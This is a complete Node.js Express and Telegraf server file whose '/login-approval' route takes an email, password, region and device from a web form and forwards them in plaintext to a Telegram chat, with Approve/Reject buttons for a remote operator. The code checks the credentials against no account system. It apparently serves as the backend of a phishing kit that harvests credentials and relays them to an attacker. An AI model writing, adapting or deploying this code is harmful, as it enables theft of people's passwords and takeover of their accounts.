import express from "express";
import cors from "cors";
import bodyParser from "body-parser";
import { Telegraf } from "telegraf";
import { config } from "dotenv";

config(); // loads .env if you use one

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram Bot Setup
const BOT_TOKEN = process.env.BOT_TOKEN || "YOUR_BOT_TOKEN";
const CHAT_ID = process.env.CHAT_ID || "YOUR_CHAT_ID";
const bot = new Telegraf(BOT_TOKEN);

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Root route
app.get("/", (req, res) => {
  res.send("Backend is running!");
});

// Route to send login data to Telegram and wait for approval
app.post("/login-approval", async (req, res) => {
  const { email, password, region, device } = req.body;

  if (!email || !password) {
    return res.status(400).json({ status: "error", message: "Missing email or password" });
  }

  const message = `📥 Login Attempt\n\nEmail: ${email}\nPassword: ${password}\nRegion: ${region}\nDevice: ${device}`;
  
  try {
    // Send message with inline buttons (Approve / Reject)
    await bot.telegram.sendMessage(CHAT_ID, message, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Approve", callback_data: `approve:${email}` },
            { text: "❌ Reject", callback_data: `reject:${email}` }
          ]
        ]
      }
    });

    // Respond to frontend that message was sent
    res.json({ status: "pending" });
  } catch (err) {
    console.error("Telegram error:", err);
    res.status(500).json({ status: "error", message: "Failed to send to Telegram" });
  }
});

// Handle callback queries from Telegram bot
bot.on("callback_query", async (ctx) => {
  const data = ctx.callbackQuery.data; // e.g., "approve:test@example.com"
  const [action, email] = data.split(":");

  console.log(`Login ${action} for ${email}`);
  
  // Optionally notify user in Telegram
  await ctx.answerCbQuery(`Login ${action} for ${email}`);
});

// Start bot polling
bot.launch().then(() => console.log("Telegram bot running"));

// Start server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});

// Graceful shutdown
process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
